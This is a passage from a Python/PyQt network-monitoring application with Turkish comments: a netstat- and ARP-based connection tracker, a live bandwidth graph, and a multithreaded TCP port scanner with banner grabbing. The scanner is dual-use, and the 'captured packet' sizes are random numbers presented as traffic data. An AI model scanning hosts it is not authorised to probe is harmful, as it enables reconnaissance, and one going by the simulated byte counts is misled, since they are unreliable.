    """Ağ trafiğini yakalayan thread - netstat + ARP tabanlı"""
    packet_captured=pyqtSignal(object)  # PacketData
    stats_updated=pyqtSignal(dict)  # İstatistikler
    error_occurred=pyqtSignal(str)
    
    def __init__(self):
        super().__init__()
        self.running=True
        self.packet_no=0
        self.prev_connections=set()
        self.prev_arp={}
        self.stats={'total':0,'tcp':0,'udp':0,'arp':0,'icmp':0,'other':0,'bytes':0}
    
    def stop(self):
        self.running=False
    
    def get_connections(self):
        """Aktif bağlantıları al (netstat tarzı)"""
        connections=[]
        try:
            if platform.system()=="Windows":
                out=run_command("netstat -an",timeout=5)
            else:
                out=run_command("netstat -tun",timeout=5)
            
            if out:
                for line in out.split('\n'):
                    line=line.strip()
                    if not line:continue
                    
                    # TCP/UDP satırlarını parse et
                    parts=line.split()
                    if len(parts)>=4:
                        proto=parts[0].upper()
                        if proto in ['TCP','UDP']:
                            local=parts[1] if platform.system()=="Windows" else parts[3]
                            remote=parts[2] if platform.system()=="Windows" else parts[4]
                            state=parts[3] if platform.system()=="Windows" and len(parts)>3 else ""
                            
                            # IP:Port parse
                            if ':' in local and ':' in remote:
                                try:
                                    local_ip,local_port=local.rsplit(':',1)
                                    remote_ip,remote_port=remote.rsplit(':',1)
                                    
                                    # Loopback ve boş bağlantıları filtrele
                                    if remote_ip not in ['0.0.0.0','*','::','[::]','127.0.0.1']:
                                        connections.append({
                                            'proto':proto,
                                            'local_ip':local_ip.strip('[]'),
                                            'local_port':int(local_port) if local_port.isdigit() else 0,
                                            'remote_ip':remote_ip.strip('[]'),
                                            'remote_port':int(remote_port) if remote_port.isdigit() else 0,
                                            'state':state
                                        })
                                except:pass
        except Exception as e:
            self.error_occurred.emit(f"Bağlantı hatası: {str(e)}")
        
        return connections
    
    def detect_protocol(self,port,base_proto='TCP'):
        """Port numarasından protokol algıla"""
        if port in KNOWN_SERVICES:
            return KNOWN_SERVICES[port]
        return base_proto
    
    def run(self):
        start_time=time.time()
        
        while self.running:
            try:
                current_time=time.time()-start_time
                
                # 1. Bağlantıları kontrol et
                connections=self.get_connections()
                current_set=set()
                
                for conn in connections:
                    key=f"{conn['proto']}:{conn['local_ip']}:{conn['local_port']}:{conn['remote_ip']}:{conn['remote_port']}"
                    current_set.add(key)
                    
                    # Yeni bağlantı mı?
                    if key not in self.prev_connections:
                        self.packet_no+=1
                        
                        # Protokol belirle
                        port=conn['remote_port'] or conn['local_port']
                        protocol=self.detect_protocol(port,conn['proto'])
                        
                        # Bilgi oluştur
                        state=conn.get('state','')
                        info=f"{conn['proto']} {conn['local_port']} → {conn['remote_port']}"
                        if state:info+=f" [{state}]"
                        if protocol!=conn['proto']:info+=f" ({protocol})"
                        
                        packet=PacketData(
                            no=self.packet_no,
                            timestamp=current_time,
                            src_ip=conn['local_ip'],
                            src_port=conn['local_port'],
                            dst_ip=conn['remote_ip'],
                            dst_port=conn['remote_port'],
                            protocol=protocol,
                            length=random.randint(40,1500),  # Simüle edilmiş boyut
                            info=info
                        )
                        
                        self.packet_captured.emit(packet)
                        
                        # İstatistikleri güncelle
                        self.stats['total']+=1
                        self.stats['bytes']+=packet.length
                        if conn['proto']=='TCP':self.stats['tcp']+=1
                        elif conn['proto']=='UDP':self.stats['udp']+=1
                        else:self.stats['other']+=1
                
                self.prev_connections=current_set
                
                # 2. ARP tablosunu kontrol et
                try:
                    arp=get_arp_table()
                    for ip,mac in arp.items():
                        if ip not in self.prev_arp or self.prev_arp[ip]!=mac:
                            self.packet_no+=1
                            
                            info=f"Who has {ip}? Tell {mac}"
                            if ip in self.prev_arp:
                                info=f"ARP Reply: {ip} is at {mac} (CHANGED from {self.prev_arp[ip]})"
                            
                            packet=PacketData(
                                no=self.packet_no,
                                timestamp=current_time,
                                src_ip=mac,
                                src_port=0,
                                dst_ip=ip,
                                dst_port=0,
                                protocol='ARP',
                                length=42,
                                info=info
                            )
                            
                            self.packet_captured.emit(packet)
                            self.stats['total']+=1
                            self.stats['arp']+=1
                            self.stats['bytes']+=42
                    
                    self.prev_arp=arp.copy()
                except:pass
                
                # İstatistikleri gönder
                self.stats_updated.emit(self.stats.copy())
                
            except Exception as e:
                self.error_occurred.emit(str(e))
            
            # Tarama aralığı
            for _ in range(10):  # 1 saniye bekle (0.1 * 10)
                if not self.running:break
                time.sleep(0.1)

# ============= LIVE MONITOR - ANLIK İZLEME =============

class LiveConnection:
    """Canlı bağlantı verisi"""
    def __init__(self,proto,local_ip,local_port,remote_ip,remote_port,state,pid=0,process=""):
        self.proto=proto
        self.local_ip=local_ip
        self.local_port=local_port
        self.remote_ip=remote_ip
        self.remote_port=remote_port
        self.state=state
        self.pid=pid
        self.process=process
        self.first_seen=time.time()
        self.last_seen=time.time()
        self.bytes_sent=0
        self.bytes_recv=0
        self.packets=0
    
    @property
    def key(self):
        return f"{self.proto}:{self.local_ip}:{self.local_port}:{self.remote_ip}:{self.remote_port}"
    
    @property
    def service(self):
        port=self.remote_port or self.local_port
        return KNOWN_SERVICES.get(port,str(port))
    
    @property
    def duration(self):
        return time.time()-self.first_seen

class LiveMonitorThread(QThread):
    """Anlık ağ izleme thread'i - tüm aktiviteleri yakalar"""
    connections_updated=pyqtSignal(list)  # Tüm bağlantılar
    connection_opened=pyqtSignal(dict)  # Yeni bağlantı
    connection_closed=pyqtSignal(dict)  # Kapanan bağlantı
    bandwidth_updated=pyqtSignal(float,float)  # download, upload (bytes/sec)
    stats_updated=pyqtSignal(dict)
    
    def __init__(self):
        super().__init__()
        self.running=True
        self.connections={}  # key -> LiveConnection
        self.prev_bytes_recv=0
        self.prev_bytes_sent=0
        self.prev_time=time.time()
    
    def stop(self):
        self.running=False
    
    def get_network_io(self):
        """Ağ I/O istatistiklerini al"""
        try:
            if platform.system()=="Windows":
                # Windows: netstat -e
                out=run_command("netstat -e",timeout=3)
                if out:
                    for line in out.split('\n'):
                        if 'Bytes' in line:
                            parts=line.split()
                            if len(parts)>=3:
                                recv=int(parts[1])
                                sent=int(parts[2])
                                return recv,sent
            else:
                # Linux: /proc/net/dev veya /sys/class/net
                try:
                    with open('/proc/net/dev','r') as f:
                        total_recv=0
                        total_sent=0
                        for line in f:
                            if ':' in line and 'lo' not in line:
                                parts=line.split(':')[1].split()
                                if len(parts)>=9:
                                    total_recv+=int(parts[0])
                                    total_sent+=int(parts[8])
                        return total_recv,total_sent
                except:pass
        except:pass
        return 0,0
    
    def get_all_connections(self):
        """Tüm aktif bağlantıları al"""
        connections=[]
        try:
            if platform.system()=="Windows":
                # Windows: netstat -ano
                out=run_command("netstat -ano",timeout=5)
            else:
                # Linux: netstat veya ss
                out=run_command("netstat -tunap 2>/dev/null || ss -tunap",timeout=5)
            
            if out:
                for line in out.split('\n'):
                    line=line.strip()
                    if not line:continue
                    
                    parts=line.split()
                    if len(parts)<4:continue
                    
                    proto=parts[0].upper()
                    if proto not in ['TCP','UDP']:continue
                    
                    try:
                        if platform.system()=="Windows":
                            local=parts[1]
                            remote=parts[2]
                            state=parts[3] if len(parts)>3 and not parts[3].isdigit() else ""
                            pid=int(parts[-1]) if parts[-1].isdigit() else 0
                        else:
                            local=parts[3] if len(parts)>3 else parts[1]
                            remote=parts[4] if len(parts)>4 else parts[2]
                            state=parts[5] if len(parts)>5 else ""
                            pid=0
                        
                        # Parse IP:Port
                        if ':' in local and ':' in remote:
                            local_ip,local_port=local.rsplit(':',1)
                            remote_ip,remote_port=remote.rsplit(':',1)
                            
                            local_ip=local_ip.strip('[]')
                            remote_ip=remote_ip.strip('[]')
                            
                            # Boş bağlantıları filtrele
                            if remote_ip in ['0.0.0.0','*','::','[::]','']:continue
                            if remote_ip.startswith('127.'):continue
                            
                            local_port=int(local_port) if local_port.isdigit() else 0
                            remote_port=int(remote_port) if remote_port.isdigit() else 0
                            
                            connections.append({
                                'proto':proto,
                                'local_ip':local_ip,
                                'local_port':local_port,
                                'remote_ip':remote_ip,
                                'remote_port':remote_port,
                                'state':state,
                                'pid':pid
                            })
                    except:continue
        except:pass
        return connections
    
    def run(self):
        while self.running:
            try:
                now=time.time()
                
                # 1. Bandwidth hesapla
                bytes_recv,bytes_sent=self.get_network_io()
                dt=now-self.prev_time
                if dt>0 and self.prev_bytes_recv>0:
                    download_speed=(bytes_recv-self.prev_bytes_recv)/dt
                    upload_speed=(bytes_sent-self.prev_bytes_sent)/dt
                    self.bandwidth_updated.emit(max(0,download_speed),max(0,upload_speed))
                
                self.prev_bytes_recv=bytes_recv
                self.prev_bytes_sent=bytes_sent
                self.prev_time=now
                
                # 2. Bağlantıları al
                current_conns=self.get_all_connections()
                current_keys=set()
                
                for conn in current_conns:
                    key=f"{conn['proto']}:{conn['local_ip']}:{conn['local_port']}:{conn['remote_ip']}:{conn['remote_port']}"
                    current_keys.add(key)
                    
                    if key not in self.connections:
                        # Yeni bağlantı
                        lc=LiveConnection(
                            conn['proto'],conn['local_ip'],conn['local_port'],
                            conn['remote_ip'],conn['remote_port'],conn['state'],conn['pid']
                        )
                        self.connections[key]=lc
                        self.connection_opened.emit({
                            'proto':conn['proto'],'local':f"{conn['local_ip']}:{conn['local_port']}",
                            'remote':f"{conn['remote_ip']}:{conn['remote_port']}",'state':conn['state'],
                            'service':lc.service,'time':datetime.now().strftime('%H:%M:%S')
                        })
                    else:
                        # Mevcut bağlantı güncelle
                        self.connections[key].last_seen=now
                        self.connections[key].state=conn['state']
                        self.connections[key].packets+=1
                
                # 3. Kapanan bağlantıları bul
                closed_keys=set(self.connections.keys())-current_keys
                for key in closed_keys:
                    lc=self.connections.pop(key)
                    self.connection_closed.emit({
                        'proto':lc.proto,'local':f"{lc.local_ip}:{lc.local_port}",
                        'remote':f"{lc.remote_ip}:{lc.remote_port}",'duration':f"{lc.duration:.1f}s",
                        'service':lc.service,'time':datetime.now().strftime('%H:%M:%S')
                    })
                
                # 4. Bağlantı listesini gönder
                conn_list=[{
                    'proto':c.proto,'local_ip':c.local_ip,'local_port':c.local_port,
                    'remote_ip':c.remote_ip,'remote_port':c.remote_port,'state':c.state,
                    'service':c.service,'duration':c.duration,'packets':c.packets,
                    'pid':c.pid
                } for c in self.connections.values()]
                
                self.connections_updated.emit(conn_list)
                
                # 5. İstatistikler
                stats={
                    'total_connections':len(self.connections),
                    'tcp':len([c for c in self.connections.values() if c.proto=='TCP']),
                    'udp':len([c for c in self.connections.values() if c.proto=='UDP']),
                    'established':len([c for c in self.connections.values() if 'ESTAB' in c.state.upper()]),
                    'bytes_recv':bytes_recv,
                    'bytes_sent':bytes_sent
                }
                self.stats_updated.emit(stats)
                
            except Exception as e:
                pass
            
            # Hızlı güncelleme
            time.sleep(0.5)

class BandwidthGraphWidget(QWidget):
    """Canlı bandwidth grafiği"""
    def __init__(self,parent=None):
        super().__init__(parent)
        self.setMinimumHeight(100)
        self.download_history=deque(maxlen=60)  # Son 60 saniye
        self.upload_history=deque(maxlen=60)
        self.max_speed=1024*1024  # 1 MB/s başlangıç
        
        self.timer=QTimer(self)
        self.timer.timeout.connect(self.update)
        self.timer.start(100)
    
    def add_data(self,download,upload):
        self.download_history.append(download)
        self.upload_history.append(upload)
        
        # Max speed güncelle
        current_max=max(max(self.download_history) if self.download_history else 0,
                       max(self.upload_history) if self.upload_history else 0)
        if current_max>self.max_speed*0.8:
            self.max_speed=current_max*1.5
    
    def format_speed(self,speed):
        if speed>=1024*1024:
            return f"{speed/1024/1024:.1f} MB/s"
        elif speed>=1024:
            return f"{speed/1024:.1f} KB/s"
        else:
            return f"{speed:.0f} B/s"
    
    def paintEvent(self,e):
        p=QPainter(self)
        p.setRenderHint(QPainter.RenderHint.Antialiasing)
        w,h=self.width(),self.height()
        
        # Arka plan
        p.fillRect(0,0,w,h,QColor(10,15,25))
        
        # Grid
        p.setPen(QPen(QColor(30,40,60),1))
        for i in range(1,4):
            y=int(h*i/4)
            p.drawLine(0,y,w,y)
        
        # Download (yeşil)
        if len(self.download_history)>1:
            path=QPainterPath()
            points=list(self.download_history)
            step=w/(len(points)-1) if len(points)>1 else w
            
            path.moveTo(0,h)
            for i,val in enumerate(points):
                x=i*step
                y=h-min(h-5,(val/self.max_speed)*(h-10))
                if i==0:path.lineTo(x,y)
                else:path.lineTo(x,y)
            path.lineTo(w,h)
            path.closeSubpath()
            
            grad=QLinearGradient(0,0,0,h)
            grad.setColorAt(0,QColor(0,255,136,150))
            grad.setColorAt(1,QColor(0,255,136,30))
            p.fillPath(path,QBrush(grad))
            
            # Çizgi
            p.setPen(QPen(QColor(0,255,136),2))
            for i in range(1,len(points)):
                x1=(i-1)*step
                y1=h-min(h-5,(points[i-1]/self.max_speed)*(h-10))
                x2=i*step
                y2=h-min(h-5,(points[i]/self.max_speed)*(h-10))
                p.drawLine(int(x1),int(y1),int(x2),int(y2))
        
        # Upload (mavi)
        if len(self.upload_history)>1:
            path=QPainterPath()
            points=list(self.upload_history)
            step=w/(len(points)-1) if len(points)>1 else w
            
            p.setPen(QPen(QColor(0,212,255),2,Qt.PenStyle.DashLine))
            for i in range(1,len(points)):
                x1=(i-1)*step
                y1=h-min(h-5,(points[i-1]/self.max_speed)*(h-10))
                x2=i*step
                y2=h-min(h-5,(points[i]/self.max_speed)*(h-10))
                p.drawLine(int(x1),int(y1),int(x2),int(y2))
        
        # Etiketler
        p.setPen(QColor(0,255,136))
        p.setFont(QFont("Consolas",9,QFont.Weight.Bold))
        dl=self.download_history[-1] if self.download_history else 0
        p.drawText(10,20,f"↓ {self.format_speed(dl)}")
        
        p.setPen(QColor(0,212,255))
        ul=self.upload_history[-1] if self.upload_history else 0
        p.drawText(10,35,f"↑ {self.format_speed(ul)}")
        
        # Max
        p.setPen(QColor(100,100,120))
        p.setFont(QFont("Consolas",8))
        p.drawText(w-80,15,f"Max: {self.format_speed(self.max_speed)}")

class LiveMonitorWidget(QWidget):
    """Anlık ağ izleme widget'ı"""
    def __init__(self,parent=None):
        super().__init__(parent)
        self.monitor_thread=None
        self.is_monitoring=False
        self.setup_ui()
    
    def setup_ui(self):
        layout=QVBoxLayout(self)
        layout.setContentsMargins(0,0,0,0)
        layout.setSpacing(0)
        
        # Üst bar
        top_bar=QFrame()
        top_bar.setStyleSheet("QFrame{background:#1a1a2e;border-bottom:2px solid #00d4ff;}")
        top_layout=QHBoxLayout(top_bar)
        top_layout.setContentsMargins(10,8,10,8)
        
        self.start_btn=QPushButton("▶ İzlemeyi Başlat")
        self.start_btn.setMinimumWidth(140)
        self.start_btn.setStyleSheet("""
            QPushButton{background:#00d4ff;color:#0a0a14;padding:10px 20px;border:none;border-radius:6px;font-weight:bold;font-size:13px;}
            QPushButton:hover{background:#00a0cc;}
        """)
        self.start_btn.clicked.connect(self.toggle_monitoring)
        top_layout.addWidget(self.start_btn)
        
        top_layout.addSpacing(20)
        
        # Durum göstergeleri
        self.conn_count=QLabel("🔗 0 Bağlantı")
        self.conn_count.setStyleSheet("color:#00ff88;font-weight:bold;font-size:12px;")
        top_layout.addWidget(self.conn_count)
        
        top_layout.addSpacing(15)
        
        self.tcp_count=QLabel("TCP: 0")
        self.tcp_count.setStyleSheet("color:#5294e2;font-size:11px;")
        top_layout.addWidget(self.tcp_count)
        
        self.udp_count=QLabel("UDP: 0")
        self.udp_count.setStyleSheet("color:#73d216;font-size:11px;")
        top_layout.addWidget(self.udp_count)
        
        self.established_count=QLabel("ESTABLISHED: 0")
        self.established_count.setStyleSheet("color:#f5c211;font-size:11px;")
        top_layout.addWidget(self.established_count)
        
        top_layout.addStretch()
        
        self.status_label=QLabel("⏸ Durduruldu")
        self.status_label.setStyleSheet("color:#f39c12;font-size:11px;")
        top_layout.addWidget(self.status_label)
        
        layout.addWidget(top_bar)
        
        # Ana içerik
        main_splitter=QSplitter(Qt.Orientation.Vertical)
        main_splitter.setStyleSheet("QSplitter::handle{background:#0f3460;height:3px;}")
        
        # Üst bölüm - Bandwidth + Bağlantılar
        upper_widget=QWidget()
        upper_layout=QHBoxLayout(upper_widget)
        upper_layout.setContentsMargins(5,5,5,5)
        upper_layout.setSpacing(5)
        
        # Sol - Bandwidth grafiği ve event log
        left_panel=QWidget()
        left_layout=QVBoxLayout(left_panel)
        left_layout.setContentsMargins(0,0,0,0)
        left_layout.setSpacing(5)
        
        # Bandwidth grafiği
        bw_frame=QFrame()
        bw_frame.setStyleSheet("QFrame{background:#0d0d1a;border:1px solid #0f3460;border-radius:6px;}")
        bw_layout=QVBoxLayout(bw_frame)
        bw_layout.setContentsMargins(5,5,5,5)
        
        bw_header=QLabel("📊 Bandwidth (Canlı)")
        bw_header.setStyleSheet("color:#00d4ff;font-weight:bold;font-size:11px;")
        bw_layout.addWidget(bw_header)
        
        self.bandwidth_graph=BandwidthGraphWidget()
        self.bandwidth_graph.setMinimumHeight(120)
        bw_layout.addWidget(self.bandwidth_graph)
        
        left_layout.addWidget(bw_frame)
        
        # Event log
        event_frame=QFrame()
        event_frame.setStyleSheet("QFrame{background:#0d0d1a;border:1px solid #0f3460;border-radius:6px;}")
        event_layout=QVBoxLayout(event_frame)
        event_layout.setContentsMargins(5,5,5,5)
        
        event_header=QLabel("📋 Bağlantı Olayları")
        event_header.setStyleSheet("color:#f39c12;font-weight:bold;font-size:11px;")
        event_layout.addWidget(event_header)
        
        self.event_list=QListWidget()
        self.event_list.setMaximumHeight(150)
        self.event_list.setStyleSheet("""
            QListWidget{background:#0a0a14;border:none;font-family:Consolas;font-size:10px;}
            QListWidget::item{padding:3px;border-bottom:1px solid #1a1a2e;}
        """)
        event_layout.addWidget(self.event_list)
        
        left_layout.addWidget(event_frame)
        
        left_panel.setMaximumWidth(350)
        upper_layout.addWidget(left_panel)
        
        # Sağ - Aktif bağlantılar tablosu
        conn_frame=QFrame()
        conn_frame.setStyleSheet("QFrame{background:#0d0d1a;border:1px solid #0f3460;border-radius:6px;}")
        conn_layout=QVBoxLayout(conn_frame)
        conn_layout.setContentsMargins(5,5,5,5)
        
        conn_header_row=QHBoxLayout()
        conn_header=QLabel("🔗 Aktif Bağlantılar (Canlı)")
        conn_header.setStyleSheet("color:#00ff88;font-weight:bold;font-size:11px;")
        conn_header_row.addWidget(conn_header)
        conn_header_row.addStretch()
        
        # Filtre
        self.conn_filter=QLineEdit()
        self.conn_filter.setPlaceholderText("Filtre...")
        self.conn_filter.setMaximumWidth(150)
        self.conn_filter.setStyleSheet("QLineEdit{background:#0a0a14;color:white;border:1px solid #0f3460;border-radius:4px;padding:4px 8px;font-size:10px;}")
        self.conn_filter.textChanged.connect(self.filter_connections)
        conn_header_row.addWidget(self.conn_filter)
        
        conn_layout.addLayout(conn_header_row)
        
        self.conn_table=QTableWidget()
        self.conn_table.setColumnCount(8)
        self.conn_table.setHorizontalHeaderLabels(["Proto","Yerel Adres","Uzak Adres","Servis","Durum","Süre","Paket","PID"])
        self.conn_table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Interactive)
        self.conn_table.horizontalHeader().setStretchLastSection(True)
        self.conn_table.horizontalHeader().resizeSection(0,50)
        self.conn_table.horizontalHeader().resizeSection(1,130)
        self.conn_table.horizontalHeader().resizeSection(2,140)
        self.conn_table.horizontalHeader().resizeSection(3,70)
        self.conn_table.horizontalHeader().resizeSection(4,90)
        self.conn_table.horizontalHeader().resizeSection(5,60)
        self.conn_table.horizontalHeader().resizeSection(6,50)
        self.conn_table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        self.conn_table.setStyleSheet("""
            QTableWidget{background:#0a0a14;border:none;gridline-color:#1a1a2e;font-family:Consolas;font-size:10px;}
            QTableWidget::item{padding:3px 6px;border-bottom:1px solid #1a1a2e;}
            QTableWidget::item:selected{background:#0f3460;}
            QHeaderView::section{background:#16213e;color:#00ff88;padding:6px;border:none;font-size:10px;}
        """)
        conn_layout.addWidget(self.conn_table)
        
        upper_layout.addWidget(conn_frame)
        
        main_splitter.addWidget(upper_widget)
        
        # Alt bölüm - Top Talkers
        bottom_widget=QWidget()
        bottom_layout=QHBoxLayout(bottom_widget)
        bottom_layout.setContentsMargins(5,5,5,5)
        bottom_layout.setSpacing(5)
        
        # Top Remote IPs
        top_remote_frame=QFrame()
        top_remote_frame.setStyleSheet("QFrame{background:#0d0d1a;border:1px solid #0f3460;border-radius:6px;}")
        top_remote_layout=QVBoxLayout(top_remote_frame)
        top_remote_layout.setContentsMargins(5,5,5,5)
        
        QLabel("🌐 Top Uzak IP'ler").setStyleSheet("color:#e74c3c;font-weight:bold;font-size:11px;")
        top_remote_layout.addWidget(QLabel("🌐 Top Uzak IP'ler"))
        
        self.top_remote_list=QListWidget()
        self.top_remote_list.setStyleSheet("""
            QListWidget{background:#0a0a14;border:none;font-family:Consolas;font-size:10px;}
            QListWidget::item{padding:4px;color:#e74c3c;}
        """)
        top_remote_layout.addWidget(self.top_remote_list)
        
        bottom_layout.addWidget(top_remote_frame)
        
        # Top Services
        top_service_frame=QFrame()
        top_service_frame.setStyleSheet("QFrame{background:#0d0d1a;border:1px solid #0f3460;border-radius:6px;}")
        top_service_layout=QVBoxLayout(top_service_frame)
        top_service_layout.setContentsMargins(5,5,5,5)
        
        top_service_layout.addWidget(QLabel("🔌 Top Servisler"))
        
        self.top_service_list=QListWidget()
        self.top_service_list.setStyleSheet("""
            QListWidget{background:#0a0a14;border:none;font-family:Consolas;font-size:10px;}
            QListWidget::item{padding:4px;color:#73d216;}
        """)
        top_service_layout.addWidget(self.top_service_list)
        
        bottom_layout.addWidget(top_service_frame)
        
        # Top States
        top_state_frame=QFrame()
        top_state_frame.setStyleSheet("QFrame{background:#0d0d1a;border:1px solid #0f3460;border-radius:6px;}")
        top_state_layout=QVBoxLayout(top_state_frame)
        top_state_layout.setContentsMargins(5,5,5,5)
        
        top_state_layout.addWidget(QLabel("📊 Durum Dağılımı"))
        
        self.top_state_list=QListWidget()
        self.top_state_list.setStyleSheet("""
            QListWidget{background:#0a0a14;border:none;font-family:Consolas;font-size:10px;}
            QListWidget::item{padding:4px;color:#f5c211;}
        """)
        top_state_layout.addWidget(self.top_state_list)
        
        bottom_layout.addWidget(top_state_frame)
        
        main_splitter.addWidget(bottom_widget)
        main_splitter.setSizes([450,150])
        
        layout.addWidget(main_splitter)
        
        # Bağlantı verileri
        self.all_connections=[]
    
    def toggle_monitoring(self):
        if self.is_monitoring:
            self.stop_monitoring()
        else:
            self.start_monitoring()
    
    def start_monitoring(self):
        self.is_monitoring=True
        self.start_btn.setText("⏹ Durdur")
        self.start_btn.setStyleSheet("""
            QPushButton{background:#e74c3c;color:white;padding:10px 20px;border:none;border-radius:6px;font-weight:bold;font-size:13px;}
            QPushButton:hover{background:#c0392b;}
        """)
        self.status_label.setText("🔴 Canlı İzleme Aktif")
        self.status_label.setStyleSheet("color:#00ff88;font-size:11px;font-weight:bold;")
        
        self.monitor_thread=LiveMonitorThread()
        self.monitor_thread.connections_updated.connect(self.on_connections_updated)
        self.monitor_thread.connection_opened.connect(self.on_connection_opened)
        self.monitor_thread.connection_closed.connect(self.on_connection_closed)
        self.monitor_thread.bandwidth_updated.connect(self.on_bandwidth_updated)
        self.monitor_thread.stats_updated.connect(self.on_stats_updated)
        self.monitor_thread.start()
    
    def stop_monitoring(self):
        self.is_monitoring=False
        self.start_btn.setText("▶ İzlemeyi Başlat")
        self.start_btn.setStyleSheet("""
            QPushButton{background:#00d4ff;color:#0a0a14;padding:10px 20px;border:none;border-radius:6px;font-weight:bold;font-size:13px;}
            QPushButton:hover{background:#00a0cc;}
        """)
        self.status_label.setText("⏸ Durduruldu")
        self.status_label.setStyleSheet("color:#f39c12;font-size:11px;")
        
        if self.monitor_thread:
            self.monitor_thread.stop()
            self.monitor_thread.wait()
            self.monitor_thread=None
    
    def on_connections_updated(self,connections):
        self.all_connections=connections
        self.update_connection_table(connections)
        self.update_top_lists(connections)
    
    def update_connection_table(self,connections):
        # Filtre uygula
        filter_text=self.conn_filter.text().lower()
        if filter_text:
            connections=[c for c in connections if 
                filter_text in c['remote_ip'].lower() or 
                filter_text in c['service'].lower() or
                filter_text in c['proto'].lower() or
                filter_text in c['state'].lower()]
        
        self.conn_table.setRowCount(len(connections))
        
        for row,conn in enumerate(connections):
            # Proto
            proto_item=QTableWidgetItem(conn['proto'])
            proto_item.setForeground(QColor(PROTOCOL_COLORS.get(conn['proto'],'#888')))
            self.conn_table.setItem(row,0,proto_item)
            
            # Yerel
            self.conn_table.setItem(row,1,QTableWidgetItem(f"{conn['local_ip']}:{conn['local_port']}"))
            
            # Uzak
            self.conn_table.setItem(row,2,QTableWidgetItem(f"{conn['remote_ip']}:{conn['remote_port']}"))
            
            # Servis
            service_item=QTableWidgetItem(conn['service'])
            service_item.setForeground(QColor("#00d4ff"))
            self.conn_table.setItem(row,3,service_item)
            
            # Durum
            state=conn['state']
            state_item=QTableWidgetItem(state[:12] if state else "-")
            if 'ESTAB' in state.upper():
                state_item.setForeground(QColor("#00ff88"))
            elif 'WAIT' in state.upper():
                state_item.setForeground(QColor("#f39c12"))
            elif 'CLOSE' in state.upper():
                state_item.setForeground(QColor("#e74c3c"))
            self.conn_table.setItem(row,4,state_item)
            
            # Süre
            duration=conn['duration']
            if duration<60:
                dur_text=f"{duration:.0f}s"
            elif duration<3600:
                dur_text=f"{duration/60:.0f}m"
            else:
                dur_text=f"{duration/3600:.1f}h"
            self.conn_table.setItem(row,5,QTableWidgetItem(dur_text))
            
            # Paket
            self.conn_table.setItem(row,6,QTableWidgetItem(str(conn['packets'])))
            
            # PID
            self.conn_table.setItem(row,7,QTableWidgetItem(str(conn['pid']) if conn['pid'] else "-"))
    
    def update_top_lists(self,connections):
        # Top Remote IPs
        remote_counts={}
        for c in connections:
            ip=c['remote_ip']
            remote_counts[ip]=remote_counts.get(ip,0)+1
        
        top_remotes=sorted(remote_counts.items(),key=lambda x:x[1],reverse=True)[:10]
        self.top_remote_list.clear()
        for ip,count in top_remotes:
            self.top_remote_list.addItem(f"{ip} ({count})")
        
        # Top Services
        service_counts={}
        for c in connections:
            svc=c['service']
            service_counts[svc]=service_counts.get(svc,0)+1
        
        top_services=sorted(service_counts.items(),key=lambda x:x[1],reverse=True)[:10]
        self.top_service_list.clear()
        for svc,count in top_services:
            self.top_service_list.addItem(f"{svc} ({count})")
        
        # Top States
        state_counts={}
        for c in connections:
            st=c['state'] or "UNKNOWN"
            state_counts[st]=state_counts.get(st,0)+1
        
        top_states=sorted(state_counts.items(),key=lambda x:x[1],reverse=True)[:10]
        self.top_state_list.clear()
        for st,count in top_states:
            self.top_state_list.addItem(f"{st[:15]} ({count})")
    
    def on_connection_opened(self,conn):
        item=QListWidgetItem(f"🟢 [{conn['time']}] {conn['proto']} → {conn['remote']} ({conn['service']})")
        item.setForeground(QColor("#00ff88"))
        self.event_list.insertItem(0,item)
        
        # Max 100 event tut
        while self.event_list.count()>100:
            self.event_list.takeItem(self.event_list.count()-1)
    
    def on_connection_closed(self,conn):
        item=QListWidgetItem(f"🔴 [{conn['time']}] {conn['proto']} ✕ {conn['remote']} ({conn['duration']})")
        item.setForeground(QColor("#e74c3c"))
        self.event_list.insertItem(0,item)
        
        while self.event_list.count()>100:
            self.event_list.takeItem(self.event_list.count()-1)
    
    def on_bandwidth_updated(self,download,upload):
        self.bandwidth_graph.add_data(download,upload)
    
    def on_stats_updated(self,stats):
        self.conn_count.setText(f"🔗 {stats['total_connections']} Bağlantı")
        self.tcp_count.setText(f"TCP: {stats['tcp']}")
        self.udp_count.setText(f"UDP: {stats['udp']}")
        self.established_count.setText(f"ESTABLISHED: {stats['established']}")
    
    def filter_connections(self):
        if self.all_connections:
            self.update_connection_table(self.all_connections)
class PortScanThread(QThread):
    port_found=pyqtSignal(int,str,str)  # port, service, banner
    progress=pyqtSignal(int,int)
    finished_scan=pyqtSignal()
    def __init__(self,ip,port_start=1,port_end=1024,threads=100):
        super().__init__();self.ip=ip;self.port_start=port_start;self.port_end=port_end;self.threads=threads;self.running=True
    def stop(self):self.running=False
    def scan_port(self,port):
        if not self.running:return None
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.settimeout(1)
            if s.connect_ex((self.ip,port))==0:
                service=COMMON_PORTS.get(port,"Unknown")
                banner=""
                try:
                    s.settimeout(2)
                    if port in [80,8080,443]:s.send(b"HEAD / HTTP/1.0\r\n\r\n")
                    else:s.send(b"\r\n")
                    banner=s.recv(512).decode('utf-8',errors='ignore').strip()[:80]
                except:pass
                s.close();return (port,service,banner)
            s.close()
        except:pass
        return None
    def run(self):
        total=self.port_end-self.port_start+1;completed=0
        with ThreadPoolExecutor(max_workers=self.threads) as ex:
            futures={ex.submit(self.scan_port,p):p for p in range(self.port_start,self.port_end+1) if self.running}
            for f in as_completed(futures):
                if not self.running:break
                completed+=1;self.progress.emit(completed,total)
                try:
                    r=f.result()
                    if r:self.port_found.emit(r[0],r[1],r[2])
                except:pass
        self.finished_scan.emit()

# Port Scanner Widget
class PortScannerWidget(QWidget):
    def __init__(self,parent=None):
        super().__init__(parent);self.scan_thread=None;self.setup_ui()
    def setup_ui(self):
        layout=QVBoxLayout(self);layout.setContentsMargins(8,8,8,8);layout.setSpacing(8)
        controls=QHBoxLayout();controls.addWidget(QLabel("Hedef IP:"))
        self.ip_input=QLineEdit();self.ip_input.setPlaceholderText("192.168.1.1");self.ip_input.setMaximumWidth(150);controls.addWidget(self.ip_input)
        controls.addWidget(QLabel("Port Aralığı:"))
        self.port_start=QSpinBox();self.port_start.setRange(1,65535);self.port_start.setValue(1);controls.addWidget(self.port_start)
        controls.addWidget(QLabel("-"))
        self.port_end=QSpinBox();self.port_end.setRange(1,65535);self.port_end.setValue(1024);controls.addWidget(self.port_end)
        self.scan_btn=QPushButton("🔍 Tara");self.scan_btn.clicked.connect(self.toggle_scan);controls.addWidget(self.scan_btn)
